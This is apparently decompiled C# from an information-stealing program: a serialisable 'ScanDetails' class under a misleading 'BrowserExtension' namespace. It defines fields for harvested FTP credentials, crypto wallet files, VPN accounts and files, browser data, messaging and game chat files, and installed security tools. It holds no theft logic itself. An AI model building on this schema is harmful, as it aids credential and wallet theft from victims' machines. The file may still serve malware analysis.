using System;
using System.Collections.Generic;
using System.Runtime.Serialization;

// Token: 0x0200004F RID: 79
[DataContract(Name = "ScanDetails", Namespace = "BrowserExtension")]
public class ScanDetails
{
	// Token: 0x17000032 RID: 50
	// (get) Token: 0x0600016E RID: 366 RVA: 0x00009CAE File Offset: 0x00007EAE
	// (set) Token: 0x0600016F RID: 367 RVA: 0x00009CB6 File Offset: 0x00007EB6
	[DataMember(Name = "SecurityUtils")]
	public List<string> SecurityUtils { get; set; } = new List<string>();

	// Token: 0x17000033 RID: 51
	// (get) Token: 0x06000170 RID: 368 RVA: 0x00009CBF File Offset: 0x00007EBF
	// (set) Token: 0x06000171 RID: 369 RVA: 0x00009CC7 File Offset: 0x00007EC7
	[DataMember(Name = "AvailableLanguages")]
	public List<string> AvailableLanguages { get; set; } = new List<string>();

	// Token: 0x17000034 RID: 52
	// (get) Token: 0x06000172 RID: 370 RVA: 0x00009CD0 File Offset: 0x00007ED0
	// (set) Token: 0x06000173 RID: 371 RVA: 0x00009CD8 File Offset: 0x00007ED8
	[DataMember(Name = "Softwares")]
	public List<string> Softwares { get; set; } = new List<string>();

	// Token: 0x17000035 RID: 53
	// (get) Token: 0x06000174 RID: 372 RVA: 0x00009CE1 File Offset: 0x00007EE1
	// (set) Token: 0x06000175 RID: 373 RVA: 0x00009CE9 File Offset: 0x00007EE9
	[DataMember(Name = "Processes")]
	public List<string> Processes { get; set; } = new List<string>();

	// Token: 0x17000036 RID: 54
	// (get) Token: 0x06000176 RID: 374 RVA: 0x00009CF2 File Offset: 0x00007EF2
	// (set) Token: 0x06000177 RID: 375 RVA: 0x00009CFA File Offset: 0x00007EFA
	[DataMember(Name = "SystemHardwares")]
	public List<SystemHardware> SystemHardwares { get; set; } = new List<SystemHardware>();

	// Token: 0x17000037 RID: 55
	// (get) Token: 0x06000178 RID: 376 RVA: 0x00009D03 File Offset: 0x00007F03
	// (set) Token: 0x06000179 RID: 377 RVA: 0x00009D0B File Offset: 0x00007F0B
	[DataMember(Name = "Browsers")]
	public List<ScannedBrowser> Browsers { get; set; } = new List<ScannedBrowser>();

	// Token: 0x17000038 RID: 56
	// (get) Token: 0x0600017A RID: 378 RVA: 0x00009D14 File Offset: 0x00007F14
	// (set) Token: 0x0600017B RID: 379 RVA: 0x00009D1C File Offset: 0x00007F1C
	[DataMember(Name = "FtpConnections")]
	public List<Account> FtpConnections { get; set; } = new List<Account>();

	// Token: 0x17000039 RID: 57
	// (get) Token: 0x0600017C RID: 380 RVA: 0x00009D25 File Offset: 0x00007F25
	// (set) Token: 0x0600017D RID: 381 RVA: 0x00009D2D File Offset: 0x00007F2D
	[DataMember(Name = "InstalledBrowsers")]
	public List<BrowserVersion> InstalledBrowsers { get; set; } = new List<BrowserVersion>();

	// Token: 0x1700003A RID: 58
	// (get) Token: 0x0600017E RID: 382 RVA: 0x00009D36 File Offset: 0x00007F36
	// (set) Token: 0x0600017F RID: 383 RVA: 0x00009D3E File Offset: 0x00007F3E
	[DataMember(Name = "ScannedFiles")]
	public List<ScannedFile> ScannedFiles { get; set; } = new List<ScannedFile>();

	// Token: 0x1700003B RID: 59
	// (get) Token: 0x06000180 RID: 384 RVA: 0x00009D47 File Offset: 0x00007F47
	// (set) Token: 0x06000181 RID: 385 RVA: 0x00009D4F File Offset: 0x00007F4F
	[DataMember(Name = "GameLauncherFiles")]
	public List<ScannedFile> GameLauncherFiles { get; set; } = new List<ScannedFile>();

	// Token: 0x1700003C RID: 60
	// (get) Token: 0x06000182 RID: 386 RVA: 0x00009D58 File Offset: 0x00007F58
	// (set) Token: 0x06000183 RID: 387 RVA: 0x00009D60 File Offset: 0x00007F60
	[DataMember(Name = "ScannedWallets")]
	public List<ScannedFile> ScannedWallets { get; set; } = new List<ScannedFile>();

	// Token: 0x1700003D RID: 61
	// (get) Token: 0x06000184 RID: 388 RVA: 0x00009D69 File Offset: 0x00007F69
	// (set) Token: 0x06000185 RID: 389 RVA: 0x00009D71 File Offset: 0x00007F71
	[DataMember(Name = "Nord")]
	public List<Account> NordAccounts { get; set; }

	// Token: 0x1700003E RID: 62
	// (get) Token: 0x06000186 RID: 390 RVA: 0x00009D7A File Offset: 0x00007F7A
	// (set) Token: 0x06000187 RID: 391 RVA: 0x00009D82 File Offset: 0x00007F82
	[DataMember(Name = "Open")]
	public List<ScannedFile> Open { get; set; }

	// Token: 0x1700003F RID: 63
	// (get) Token: 0x06000188 RID: 392 RVA: 0x00009D8B File Offset: 0x00007F8B
	// (set) Token: 0x06000189 RID: 393 RVA: 0x00009D93 File Offset: 0x00007F93
	[DataMember(Name = "Proton")]
	public List<ScannedFile> Proton { get; set; }

	// Token: 0x17000040 RID: 64
	// (get) Token: 0x0600018A RID: 394 RVA: 0x00009D9C File Offset: 0x00007F9C
	// (set) Token: 0x0600018B RID: 395 RVA: 0x00009DA4 File Offset: 0x00007FA4
	[DataMember(Name = "MessageClientFiles")]
	public List<ScannedFile> MessageClientFiles { get; set; }

	// Token: 0x17000041 RID: 65
	// (get) Token: 0x0600018C RID: 396 RVA: 0x00009DAD File Offset: 0x00007FAD
	// (set) Token: 0x0600018D RID: 397 RVA: 0x00009DB5 File Offset: 0x00007FB5
	[DataMember(Name = "GameChatFiles")]
	public List<ScannedFile> GameChatFiles { get; set; }
}
